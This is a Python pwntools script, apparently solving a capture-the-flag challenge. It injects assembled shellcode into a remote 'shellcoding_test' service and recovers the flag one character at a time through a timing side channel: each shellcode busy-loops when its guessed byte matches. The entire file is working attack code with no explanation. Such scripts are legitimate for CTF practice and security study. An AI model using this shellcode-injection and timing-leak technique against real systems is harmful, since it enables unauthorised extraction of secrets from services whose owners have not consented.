#!/usr/bin/python
from pwn import *
from time import time
import string

flag = ""
exe = './shellcoding_test'
elf = context.binary = ELF(exe, checksec = 0)
context.log_level = 'error'
context.arch = 'amd64'
def gen_shellcode(idx, char):
    return asm(f"""
        pop     r10
        pop     rsi
        mov     al, byte ptr [rsi+{idx}]
        cmp     al, {ord(char)}
        jne     .EXIT
        xor     rcx, rcx
    .LOOP:
        inc     rcx
        mov     rdx, 0x400000000
        cmp     rcx, rdx
        jle     .LOOP
    .EXIT:
        ret
    """)

flag = ""

while not flag.endswith("}"):
    for c in string.printable:
        # io = process(exe)
        io = remote("192.168.0.52", 10202)
        t = time()
        io.sendline(gen_shellcode(len(flag), c))
        io.recvall()
        # print(c)
        delta = time() - t
        if delta > 2.4:
            flag += c
            print(flag)
            break
        io.close()
            